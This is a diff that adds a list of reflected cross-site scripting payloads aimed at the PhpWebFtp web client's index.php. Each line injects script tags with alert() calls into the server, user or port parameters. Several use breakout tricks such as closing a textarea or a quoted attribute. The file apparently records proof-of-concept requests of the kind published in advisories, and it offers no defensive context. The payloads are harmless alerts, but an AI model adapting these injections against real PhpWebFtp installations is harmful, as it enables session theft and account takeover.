@@ -1,0 +1,7 @@
+http://www.anysite.com/PhpWebFtp/index.php?server=1&amp;port=&lt;script&gt;var%20sub_variable=11233;alert(sub_variable);&lt;/script&gt;&amp;goPassive=on&amp;user=1&amp;password=1&amp;language=bulgarian server=&lt;script&gt;alert(&#039;&#039;as-208395078&#039;);&lt;/script&gt;&amp;port=21&amp;goPassive=on&amp;user=1&amp;password=1&amp;language=bulgarian 
+server=1&amp;port=21&amp;goPassive=on&amp;user=&lt;script&gt;alert(&#039;as-453627&#039;);&lt;/script&gt;&amp;password=1&amp;language=bulgarian
+server=&gt;&lt;script&gt;alert(&#039;as-208395078&#039;);&lt;/script&gt;&amp;port=21&amp;goPassive=on&amp;user=1&amp;password=1&amp;language=bulgarian
+server=1&amp;port=21&amp;goPassive=on&amp;user=&#039;&gt;&lt;script&gt;alert(&#039;as-208395078&#039;);&lt;/script&gt;&amp;password=1&amp;language=bulgarian
+server=&lt;/textarea&gt;&lt;script&gt;alert(&#039;2134327801&#039;);&lt;/script&gt;&amp;port=21&amp;goPassive=on&amp;user=1&amp;password=1&amp;language=bulgarian
+server=1&amp;port=21&amp;goPassive=on&amp;user=&lt;script&gt;var%20test_variable=878173184;
+alert(test_variable);&lt;/script&gt;&amp;password=1&amp;language=bulgarian
